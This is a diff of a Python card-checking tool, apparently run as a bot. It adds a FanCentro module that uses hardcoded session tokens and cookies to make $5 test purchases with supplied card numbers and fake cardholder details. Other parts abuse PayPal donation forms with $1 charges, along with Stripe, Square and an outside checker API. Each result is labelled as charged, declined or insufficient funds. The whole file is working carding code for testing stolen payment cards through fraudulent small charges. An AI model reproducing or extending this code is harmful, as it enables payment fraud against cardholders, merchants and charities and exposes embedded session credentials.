@@ -35,6 +35,11 @@ pending_files = {}
 hit_counter = 0
 HIT_CHAT_ID = -1002429830194
 
+# ==================== FanCentro Data ====================
+FAN_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3ODgxMDczNjcsInBvcnRhbCI6ImZoIiwibmljayI6Imdvb2dsZTE3ODc5NzI0ODMiLCJ1X2lkIjoxNTExNDgxMTF9.d0O3hcRSDmF9C7Y8_U-Z5U4V1ThytVghYMucD1FSlfU"
+FAN_COOKIE = "test_group=A; __Host-ss=v1OQJVKVZ5tDJqlr-i7idxYXn59H9cmKPxm8ruy0RxYmcxNzk1NzUxMjkzMTI0NzExNTAxNTMyMzQ2NjQ1; __Host-platform=v1usg0iCXSZtBXnCy8tyvnV7yK5SWyC0uJx0z2FcL3hDkxNzk1ODc2MTY2bW9iaWxl; __Host-uviuil=v16xMj5opVf9vNoFxPayEbRWA_b9OQ2j6-JwNwTObicFgxNzg4MTg2NTY2MkFnVG5sREZtcS11ZHVVUE1yNzlhbmY2Ul9OQ3pJU2c1LXZVM0d1Vw.."
+FAN_SKU = "hRgc9MvkznEE3SqVYKPz_F1FL_RMyUFL6eEM0RKjTqnbLnUX3OArmKKkHbBocUqPxoSzV20u7_gFrXhtTJwO-AN99gBoclLBUm7noYuMrFsq-kVEsAC4wo_PtlNm9mJeue_YU_o5zTpPN1L3OTZfs_AbnLcr3OUUzoH-i0Bc"
+
 try:
     with open('stripe_keys.json', 'r') as f:
         STRIPE_KEYS = json.load(f)
@@ -111,24 +116,95 @@ async def get_bin_info(bin_number):
             continue
         await asyncio.sleep(0.5)
     return "Unknown", "Unknown", "Unknown"
+    # ==================== FanCentro Functions ====================
+def fan_refresh_token():
+    global FAN_TOKEN
+    h = {'authorization': f'Bearer {FAN_TOKEN}', 'content-type': 'application/json', 'cookie': FAN_COOKIE, 'origin': 'https://fancentro.com', 'referer': 'https://fancentro.com/', 'user-agent': 'Mozilla/5.0'}
+    p = {"withCredentials": True, "isRefreshToken": True}
+    try:
+        r = requests.post("https://fancentro.com/api/v1/api/refreshToken", json=p, headers=h, timeout=30)
+        if r.status_code == 200:
+            data = r.json()
+            for key in ['token', 'jwt', 'access_token', 'refreshToken', 'accessToken']:
+                if key in data and data[key]:
+                    FAN_TOKEN = data[key]
+                    return True
+            auth = r.headers.get('authorization', '')
+            if auth:
+                FAN_TOKEN = auth.replace('Bearer ', '')
+                return True
+            match = re.search(r'eyJ[A-Za-z0-9\-\._]{50,}', r.text)
+            if match:
+                FAN_TOKEN = match.group(0)
+                return True
+    except:
+        pass
+    return False
 
+def fan_headers():
+    return {'authorization': f'Bearer {FAN_TOKEN}', 'content-type': 'application/json', 'cookie': FAN_COOKIE, 'origin': 'https://fancentro.com', 'referer': 'https://fancentro.com/chat', 'user-agent': 'Mozilla/5.0'}
+
+def fan_init():
+    p = {"creditAmount":500,"displayAmount":"5","displayAmountFormatted":"5,00 $","priceAmountUsd":5,"taxDisclaimer":"","billingDisclaimer":"One time charge of 5,00 $. Will not rebill.","amount":5,"taxAmount":0,"totalAmount":5,"taxDisplayType":1,"taxApplicationId":"","taxRate":0,"taxName":"","productSku":FAN_SKU,"freeCreditsAmount":0,"freeCreditsPercent":0,"currency":"USD","currencySymbol":"$","creditAmountTotal":500,"paymentType":"cc","paymentMethod":"cc","displayName":"CREDIT CARD","type":"credit","baseAmount":5,"freeCreditAmount":0,"price":"5"}
+    r = requests.post("https://fancentro.com/api/v2/api/purchase/credits/init", json=p, headers=fan_headers(), timeout=30)
+    if r.status_code == 401:
+        fan_refresh_token()
+        r = requests.post("https://fancentro.com/api/v2/api/purchase/credits/init", json=p, headers=fan_headers(), timeout=30)
+    if r.status_code != 200: return None
+    d = r.json()['mgpgResponse']
+    pr = d['nextAction']['extensions']['proxySettings']['settings']
+    return {'sid': d['sessionId'], 'cid': d['correlationId'], 'jwt': d['jwtToken'], 'vurl': r.json().get('validationUrl'), 'akey': pr['authenticationKey'], 'ts': pr['timestamp'], 'tid': pr['identifier']}
+
+def fan_tokenize(s, card, cvv):
+    p = {"TokenExID":s['tid'],"Origin":"https://fancentro.com","AuthenticationKey":s['akey'],"Timestamp":s['ts'],"Data":card,"CvvValue":cvv,"TokenScheme":"PCI","CvvOnly":"False","PCI":"True","ReturnHash":None,"use3DS":"False","EnforceLuhnCompliance":"true","CustomDataLuhnCheck":True}
+    h = {'content-type':'application/json','origin':'https://htp.tokenex.com','referer':'https://htp.tokenex.com/iframe/v3','user-agent':'Mozilla/5.0'}
+    r = requests.post("https://htp.tokenex.com/iframe/v3", json=p, headers=h, timeout=30)
+    if r.status_code != 200: return None
+    return r.json().get('token', '')
+
+def fan_pay(s, token, cvv, em, ey):
+    h = {'Content-Type':'application/json','x-auth-token':s['jwt'],'x-session-id':s['sid'],'x-correlation-id':s['cid'],'Origin':'https://fancentro.com','Referer':'https://fancentro.com/','User-Agent':'Mozilla/5.0'}
+    p = {"sessionId":s['sid'],"correlationId":s['cid'],"payment":{"paymentInformation":{"cardInformation":{"ccNumber":token,"cvv":cvv,"cardExpirationMonth":em,"cardExpirationYear":ey,"cardHolderInfo":{"firstName":"wafa","lastName":"bro","email":"Iadiitiomjs@gmail.com","countryCode":"US","zipCode":"10001"}}},"validationUrl":s['vurl']}}
+    return requests.post("https://mgpg2.probiller.com/api/process", json=p, headers=h, timeout=30)
+
+def fan_check_card(card, cvv, em, ey):
+    fan_refresh_token()
+    s = fan_init()
+    if not s: return "ERROR: Init failed"
+    t = fan_tokenize(s, card, cvv)
+    if not t: return "ERROR: TokenEx failed"
+    r = fan_pay(s, t, cvv, em, ey)
+    if r.status_code != 200:
+        return f"ERROR {r.status_code}"
+    d = r.json()
+    charges = d.get('invoice', {}).get('charges', [])
+    if charges:
+        c = charges[0]
+        status = c.get('status', '')
+        reason = c.get('reason', '')
+        error_msg = c.get('errorClassification', {}).get('groupMessage', '')
+        if status == 'approved': return "CHARGE 5$"
+        elif 'INSUFFICIENT' in reason.upper() or 'FUNDS' in reason.upper() or 'INSUFFICIENT' in error_msg.upper(): return "INSUFFICIENT_FUNDS"
+        elif status == 'decline': return f"DECLINED - {reason}"
+        elif status == 'aborted': return f"DEAD - {reason}"
+        else: return f"{status} - {reason}"
+    return d.get('nextAction', {}).get('reason', 'Unknown')
+
+def fan_parse_line(line):
+    line = line.strip()
+    for sep in ['|',',',':',';','\t']:
+        if sep in line:
+            parts = [p.strip() for p in line.split(sep) if p.strip()]
+            break
+    else:
+        parts = line.split()
+    if len(parts) < 4: return None
+    return parts[0], parts[3], parts[1].zfill(2), "20"+parts[2] if len(parts[2])==2 else parts[2]
+    # ==================== PayPal ====================
 class PayPalCommerce:
     def __init__(self, target_url):
-        self.first_name = [
-            "James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles",
-            "Roger", "Noah", "Daniel", "Matthew", "Anthony", "Mark", "Steven", "Paul", "Andrew", "Joshua",
-            "Kevin", "Brian", "Edward", "George", "Ronald", "Teresa", "Mary", "Patricia", "Jennifer", "Linda",
-            "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen", "Nancy", "Lisa", "Betty", "Margaret",
-            "Sandra", "Ashley", "Kimberly", "Emily", "Donna", "Michelle", "Carol", "Amanda", "Dorothy", "Melissa",
-            "Deborah", "Stephanie", "Rebecca", "Sharon", "Laura", "Cynthia", "Kathleen", "Amy", "Angela", "Shirley"
-        ]
-        self.last_name = [
-            "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez",
-            "Morgan", "Wilson", "Anderson", "Taylor", "Thomas", "Moore", "Jackson", "Martin", "Lee", "Thompson",
-            "White", "Harris", "Clark", "Lewis", "Walker", "Rath", "Hall", "Allen", "Young", "Hernandez",
-            "King", "Wright", "Lopez", "Hill", "Scott", "Green", "Adams", "Baker", "Gonzalez", "Nelson",
-            "Carter", "Mitchell", "Perez", "Roberts", "Turner", "Phillips", "Campbell", "Parker", "Evans", "Edwards"
-        ]
+        self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Roger", "Noah", "Daniel", "Matthew", "Anthony", "Mark", "Steven", "Paul", "Andrew", "Joshua", "Kevin", "Brian", "Edward", "George", "Ronald", "Teresa", "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen", "Nancy", "Lisa", "Betty", "Margaret", "Sandra", "Ashley", "Kimberly", "Emily", "Donna", "Michelle", "Carol", "Amanda", "Dorothy", "Melissa", "Deborah", "Stephanie", "Rebecca", "Sharon", "Laura", "Cynthia", "Kathleen", "Amy", "Angela", "Shirley"]
+        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Morgan", "Wilson", "Anderson", "Taylor", "Thomas", "Moore", "Jackson", "Martin", "Lee", "Thompson", "White", "Harris", "Clark", "Lewis", "Walker", "Rath", "Hall", "Allen", "Young", "Hernandez", "King", "Wright", "Lopez", "Hill", "Scott", "Green", "Adams", "Baker", "Gonzalez", "Nelson", "Carter", "Mitchell", "Perez", "Roberts", "Turner", "Phillips", "Campbell", "Parker", "Evans", "Edwards"]
         self.donation = "1.00"
         self.minimum_amount = "1.00"
         self.currency = "USD"
@@ -148,58 +224,9 @@ class PayPalCommerce:
             self.inurl += f"?{urlparse(target_url).query}"
         self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
         self.is_valid_gateway = True
-
-        self.paypal_responses = [
-            'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED', 'TRANSACTION_REFUSED',
-            'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED', 'CARD_DECLINED',
-            'PAYMENT_DENIED', 'PAYER_CANNOT_PAY', 'EXPIRED_CARD',
-            'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR', 'ACCOUNT_CLOSED',
-            'LOST_OR_STOLEN', 'CVV2_FAILURE', 'SUSPECTED_FRAUD',
-            'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER',
-            'PICKUP_CARD_SPECIAL_CONDITIONS', 'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION',
-            'TRANSACTION_NOT_PERMITTED', 'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
-            'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'INVALID_OR_RESTRICTED_CARD',
-            'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE', 'TRANSACTION_CANNOT_BE_COMPLETED',
-            'DECLINED_PLEASE_RETRY', 'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
-            'DECLINED', 'CHARGE', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
-            'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED',
-            'NOT_ENABLED_FOR_CARD_PROCESSING', 'CARD_TYPE_NOT_SUPPORTED',
-            'MERCHANT_NOT_ENABLED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
-            'INVALID_CURRENCY', 'CURRENCY_NOT_SUPPORTED', 'AMOUNT_MISMATCH',
-            'ITEM_TOTAL_MISMATCH', 'TAX_TOTAL_MISMATCH', 'SHIPPING_TOTAL_MISMATCH',
-            'HANDLING_TOTAL_MISMATCH', 'INSURANCE_TOTAL_MISMATCH', 'SHIPPING_DISCOUNT_MISMATCH',
-            'INVALID_PAYER_ID', 'INVALID_PAYEE_ID', 'INVALID_RESOURCE_ID',
-            'INVALID_PARAMETER', 'INVALID_PARAMETER_SYNTAX', 'INVALID_STRING_LENGTH',
-            'INVALID_STRING_FORMAT', 'MISSING_REQUIRED_PARAMETER', 'DUPLICATE_REQUEST_ID',
-            'DUPLICATE_INVOICE_ID', 'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
-            'PAYEE_ACCOUNT_RESTRICTED', 'PAYEE_ACCOUNT_INVALID', 'PAYEE_ACCOUNT_LOCKED_OR_CLOSED',
-            'PAYEE_BLOCKED_TRANSACTION', 'PAYER_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED',
-            'PAYER_ACCOUNT_INVALID', 'UNSUPPORTED_INTENT', 'UNSUPPORTED_PAYMENT_INSTRUMENT',
-            'UNSUPPORTED_SHIPPING_TYPE', 'SHIPPING_ADDRESS_INVALID', 'SHIPPING_OPTION_NOT_SUPPORTED',
-            'MULTIPLE_SHIPPING_ADDRESS_NOT_SUPPORTED', 'MULTIPLE_SHIPPING_OPTION_SELECTED',
-            'INVALID_PICKUP_ADDRESS', 'PICKUP_ADDRESS_INVALID', 'INVALID_SHIPPING_ADDRESS',
-            'AUTHORIZATION_VOIDED', 'AUTHORIZATION_EXPIRED', 'AUTHORIZATION_DENIED',
-            'AUTHORIZATION_CAPTURED', 'CAPTURE_FULLY_REFUNDED', 'CAPTURE_PARTIALLY_REFUNDED',
-            'REFUND_NOT_PERMITTED', 'REFUND_DENIED', 'REFUND_FAILED',
-            'TRANSACTION_ALREADY_REFUNDED', 'TRANSACTION_LIMIT_EXCEEDED',
-            'BILLING_AGREEMENT_NOT_FOUND', 'BILLING_AGREEMENT_CANCELLED',
-            'BILLING_AGREEMENT_EXPIRED', 'BILLING_AGREEMENT_FAILED',
-            'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'RESOURCE_NOT_FOUND',
-            'METHOD_NOT_ALLOWED', 'NOT_ACCEPTABLE', 'UNSUPPORTED_MEDIA_TYPE',
-            'RATE_LIMIT_REACHED', 'INSUFFICIENT_PERMISSIONS', 'INVALID_ACCESS_TOKEN',
-            'EXPIRED_ACCESS_TOKEN', 'MALFORMED_REQUEST', 'UNKNOWN_ERROR',
-        ]
-
-        self.user_agents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
-        ]
+        self.paypal_responses = ['INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED', 'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED', 'CARD_DECLINED', 'PAYMENT_DENIED', 'PAYER_CANNOT_PAY', 'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR', 'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE', 'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER', 'PICKUP_CARD_SPECIAL_CONDITIONS', 'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED', 'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT', 'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE', 'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY', 'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'DECLINED', 'CHARGE', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR', 'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED', 'NOT_ENABLED_FOR_CARD_PROCESSING', 'CARD_TYPE_NOT_SUPPORTED', 'MERCHANT_NOT_ENABLED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING', 'INVALID_CURRENCY', 'CURRENCY_NOT_SUPPORTED', 'AMOUNT_MISMATCH', 'ITEM_TOTAL_MISMATCH', 'TAX_TOTAL_MISMATCH', 'SHIPPING_TOTAL_MISMATCH', 'HANDLING_TOTAL_MISMATCH', 'INSURANCE_TOTAL_MISMATCH', 'SHIPPING_DISCOUNT_MISMATCH', 'INVALID_PAYER_ID', 'INVALID_PAYEE_ID', 'INVALID_RESOURCE_ID', 'INVALID_PARAMETER', 'INVALID_PARAMETER_SYNTAX', 'INVALID_STRING_LENGTH', 'INVALID_STRING_FORMAT', 'MISSING_REQUIRED_PARAMETER', 'DUPLICATE_REQUEST_ID', 'DUPLICATE_INVOICE_ID', 'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED', 'PAYEE_ACCOUNT_RESTRICTED', 'PAYEE_ACCOUNT_INVALID', 'PAYEE_ACCOUNT_LOCKED_OR_CLOSED', 'PAYEE_BLOCKED_TRANSACTION', 'PAYER_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED', 'PAYER_ACCOUNT_INVALID', 'UNSUPPORTED_INTENT', 'UNSUPPORTED_PAYMENT_INSTRUMENT', 'UNSUPPORTED_SHIPPING_TYPE', 'SHIPPING_ADDRESS_INVALID', 'SHIPPING_OPTION_NOT_SUPPORTED', 'MULTIPLE_SHIPPING_ADDRESS_NOT_SUPPORTED', 'MULTIPLE_SHIPPING_OPTION_SELECTED', 'INVALID_PICKUP_ADDRESS', 'PICKUP_ADDRESS_INVALID', 'INVALID_SHIPPING_ADDRESS', 'AUTHORIZATION_VOIDED', 'AUTHORIZATION_EXPIRED', 'AUTHORIZATION_DENIED', 'AUTHORIZATION_CAPTURED', 'CAPTURE_FULLY_REFUNDED', 'CAPTURE_PARTIALLY_REFUNDED', 'REFUND_NOT_PERMITTED', 'REFUND_DENIED', 'REFUND_FAILED', 'TRANSACTION_ALREADY_REFUNDED', 'TRANSACTION_LIMIT_EXCEEDED', 'BILLING_AGREEMENT_NOT_FOUND', 'BILLING_AGREEMENT_CANCELLED', 'BILLING_AGREEMENT_EXPIRED', 'BILLING_AGREEMENT_FAILED', 'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'RESOURCE_NOT_FOUND', 'METHOD_NOT_ALLOWED', 'NOT_ACCEPTABLE', 'UNSUPPORTED_MEDIA_TYPE', 'RATE_LIMIT_REACHED', 'INSUFFICIENT_PERMISSIONS', 'INVALID_ACCESS_TOKEN', 'EXPIRED_ACCESS_TOKEN', 'MALFORMED_REQUEST', 'UNKNOWN_ERROR']
+        self.user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0']
         self.ua_index = 0
-
         self._init_and_extract()
         self._get_access_token()
         self._get_client_token()
@@ -210,58 +237,23 @@ class PayPalCommerce:
         return ua
 
     def get_address_data(self):
-        return {
-            'give-address1': '123 Main Street', 'give-address2': 'Apt 4B',
-            'give_Address2': 'Apt 4B', 'give-address_2': 'Apt 4B',
-            'give_address2': 'Apt 4B', 'give_address_2': 'Apt 4B',
-            'address_2': 'Apt 4B', 'address2': 'Apt 4B',
-            'give-city': 'New York City', 'give-state': 'NY',
-            'give-zip': '10001', 'give-country': 'US', 'give-phone': '2125551234',
-            'address1': '123 Main Street', 'city': 'New York City',
-            'state': 'NY', 'zip': '10001', 'country': 'US', 'phone': '2125551234',
-            'billing_address_2': 'Apt 4B', 'shipping_address_2': 'Apt 4B',
-        }
+        return {'give-address1': '123 Main Street', 'give-address2': 'Apt 4B', 'give_Address2': 'Apt 4B', 'give-address_2': 'Apt 4B', 'give_address2': 'Apt 4B', 'give_address_2': 'Apt 4B', 'address_2': 'Apt 4B', 'address2': 'Apt 4B', 'give-city': 'New York City', 'give-state': 'NY', 'give-zip': '10001', 'give-country': 'US', 'give-phone': '2125551234', 'address1': '123 Main Street', 'city': 'New York City', 'state': 'NY', 'zip': '10001', 'country': 'US', 'phone': '2125551234', 'billing_address_2': 'Apt 4B', 'shipping_address_2': 'Apt 4B'}
 
     def get_terms_data(self):
-        return {
-            'give_agree_to_terms': '1', 'give_tos_agree': '1',
-            'give_terms_agreement': '1', 'give_terms': '1',
-            'agree_to_terms': '1', 'tos_agree': '1',
-        }
+        return {'give_agree_to_terms': '1', 'give_tos_agree': '1', 'give_terms_agreement': '1', 'give_terms': '1', 'agree_to_terms': '1', 'tos_agree': '1'}
 
     def get_base_form_data(self):
         form_data = self.form_data.copy()
         first_name = random.choice(self.first_name)
         last_name = random.choice(self.last_name)
-        form_data.update({
-            'give-amount': self.minimum_amount, 'give-currency': self.currency,
-            'currency': self.currency, 'payment-mode': 'paypal-commerce',
-            'give_first': first_name, 'give_last': last_name,
-            'first_name': first_name, 'last_name': last_name,
-            'give_email': self.email, 'email': self.email,
-            'give-gateway': 'paypal-commerce', 'give_company': '',
-            'give_comment': '', 'give_anonymous': '0',
-        })
+        form_data.update({'give-amount': self.minimum_amount, 'give-currency': self.currency, 'currency': self.currency, 'payment-mode': 'paypal-commerce', 'give_first': first_name, 'give_last': last_name, 'first_name': first_name, 'last_name': last_name, 'give_email': self.email, 'email': self.email, 'give-gateway': 'paypal-commerce', 'give_company': '', 'give_comment': '', 'give_anonymous': '0'})
         form_data.update(self.get_address_data())
         form_data.update(self.get_terms_data())
         return form_data
 
     def _extract_minimum_amount(self, html):
         try:
-            patterns = [
-                r'minimum donation amount of \$([\d.]+)',
-                r'minimum donation amount of &euro;([\d.]+)',
-                r'minimum donation amount of €([\d.]+)',
-                r'minimum donation amount of £([\d.]+)',
-                r'minimum donation amount[^\d]*([\d.]+)',
-                r'data-min-amount=["\']([\d.]+)["\']',
-                r'data-minimum-amount=["\']([\d.]+)["\']',
-                r'min-amount=["\']([\d.]+)["\']',
-                r'minimum_amount=["\']([\d.]+)["\']',
-                r'min_amount=["\']([\d.]+)["\']',
-                r'This form has a minimum donation amount of \$([\d.]+)',
-                r'This form has a minimum donation amount of &euro;([\d.]+)',
-            ]
+            patterns = [r'minimum donation amount of \$([\d.]+)', r'minimum donation amount of &euro;([\d.]+)', r'minimum donation amount of €([\d.]+)', r'minimum donation amount of £([\d.]+)', r'minimum donation amount[^\d]*([\d.]+)', r'data-min-amount=["\']([\d.]+)["\']', r'data-minimum-amount=["\']([\d.]+)["\']', r'min-amount=["\']([\d.]+)["\']', r'minimum_amount=["\']([\d.]+)["\']', r'min_amount=["\']([\d.]+)["\']', r'This form has a minimum donation amount of \$([\d.]+)', r'This form has a minimum donation amount of &euro;([\d.]+)']
             for pattern in patterns:
                 match = re.search(pattern, html, re.IGNORECASE)
                 if match:
@@ -288,11 +280,7 @@ class PayPalCommerce:
 
     def _init_and_extract(self):
         try:
-            headers = {
-                'user-agent': self.get_next_ua(),
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'accept-language': 'en-US,en;q=0.9'
-            }
+            headers = {'user-agent': self.get_next_ua(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9'}
             response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
             self.cookies = dict(response.cookies)
             html = response.text
@@ -307,11 +295,7 @@ class PayPalCommerce:
             self.is_valid_gateway = False
 
     def _extract_client_id(self, html):
-        patterns = [
-            r'client-id="([^"]+)"', r'client_id["\']?\s*[:=]\s*["\']([^"\']+)',
-            r'data-client-id="([^"]+)"', r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})',
-            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)', r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)'
-        ]
+        patterns = [r'client-id="([^"]+)"', r'client_id["\']?\s*[:=]\s*["\']([^"\']+)', r'data-client-id="([^"]+)"', r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})', r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)', r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)']
         for pattern in patterns:
             match = re.search(pattern, html, re.IGNORECASE)
             if match:
@@ -509,15 +493,12 @@ class PayPalCommerce:
             return "DECLINED"
         text_strip = text.strip()
         text_lower = text_strip.lower()
-
         if 'order_not_approved' in text_lower:
             return "Payer cannot pay for this transaction."
         if '"status":"APPROVED"' in text_lower or '"status": "APPROVED"' in text_lower:
             return "APPROVED"
-
         if text_lower == 'true':
             return 'CHARGE 1.0'
-
         try:
             approve_json = json.loads(text_strip)
             if isinstance(approve_json, dict):
@@ -533,7 +514,6 @@ class PayPalCommerce:
                                 return 'CHARGE 1.0'
         except:
             pass
-
         try:
             approve_json = json.loads(text_strip)
             if isinstance(approve_json, dict):
@@ -541,7 +521,6 @@ class PayPalCommerce:
                     return 'CHARGE 1.0'
         except:
             pass
-
         try:
             approve_json = json.loads(text_strip)
             if isinstance(approve_json, dict):
@@ -553,7 +532,6 @@ class PayPalCommerce:
                                     return 'CHARGE 1.0'
         except:
             pass
-
         try:
             approve_json = json.loads(text_strip)
             if isinstance(approve_json, dict):
@@ -563,19 +541,15 @@ class PayPalCommerce:
                         return 'CHARGE 1.0'
         except:
             pass
-
         if 'insufficient' in text_lower:
             return 'INSUFFICIENT_FUNDS'
-
         for pr in self.paypal_responses:
             if pr in text_strip.upper():
                 if pr == 'ORDER_NOT_APPROVED':
                     return "Payer cannot pay for this transaction."
                 return pr
-
         if len(text_strip) < 100:
             return "PAYER_ACTION_REQUIRED"
-
         return text_strip[:200]
 
     def Charge(self, ccx):
@@ -616,7 +590,6 @@ class PayPalCommerce:
                         break
                 except:
                     continue
-
             if isinstance(confirm_json, dict):
                 if 'details' in confirm_json and len(confirm_json['details']) > 0:
                     detail = confirm_json['details'][0]
@@ -637,7 +610,6 @@ class PayPalCommerce:
                         return name
                 if 'message' in confirm_json:
                     return confirm_json.get('message', '')
-
             if confirm_text:
                 try:
                     text_json = json.loads(confirm_text)
@@ -678,13 +650,10 @@ class PayPalCommerce:
                         if msg_matches:
                             return f"{name}: {msg_matches[0]}"
                         return name
-
             approve_res = self._approve_order(order_id)
             text = approve_res.text if approve_res else ''
-
             if text:
                 return self._clean_response(text)
-
             return "DECLINED"
         except Exception as e:
             return f"Error: {e}"
@@ -699,7 +668,6 @@ async def check_card_api(card_full, gateway_url):
             result_raw = await loop.run_in_executor(None, run_check)
             result = str(result_raw)
             result_lower = result.lower()
-
             if result.startswith("CHARGE"):
                 return "approved", result_raw
             elif "insufficient" in result_lower:
@@ -714,6 +682,7 @@ async def check_card_api(card_full, gateway_url):
         except Exception as e:
             return "declined", f"Error: {e}"
 
+# ==================== Stripe ====================
 def check_stripe_sync(card, key_id="1"):
     try:
         if not STRIPE_KEYS:
@@ -778,6 +747,7 @@ def check_stripe_sync(card, key_id="1"):
         except:
             pass
 
+# ==================== Square ====================
 def classify_square_error(msg):
     msg_lower = str(msg).lower()
     if 'insufficient' in msg_lower:
@@ -907,18 +877,13 @@ def check_square_sync(card):
     finally:
         session.close()
 
+# ==================== Auth ====================
 def check_auth_sync(card):
     try:
         session = requests.Session()
         session.verify = False
         data = MultipartEncoder({'data': (None, card),})
-        headers = {
-            'authority': 'uncoder.eu.org', 'accept': '*/*',
-            'accept-language': 'ar-CA,ar;q=0.9,en-CA;q=0.8,en;q=0.7,en-US;q=0.6',
-            'content-type': data.content_type, 'origin': 'https://uncoder.eu.org',
-            'referer': 'https://uncoder.eu.org/cc-checker/',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-        }
+        headers = {'authority': 'uncoder.eu.org', 'accept': '*/*', 'accept-language': 'ar-CA,ar;q=0.9,en-CA;q=0.8,en;q=0.7,en-US;q=0.6', 'content-type': data.content_type, 'origin': 'https://uncoder.eu.org', 'referer': 'https://uncoder.eu.org/cc-checker/', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'}
         start_time = time.time()
         response = session.post('https://uncoder.eu.org/cc-checker/api.php', headers=headers, data=data)
         end_time = time.time()
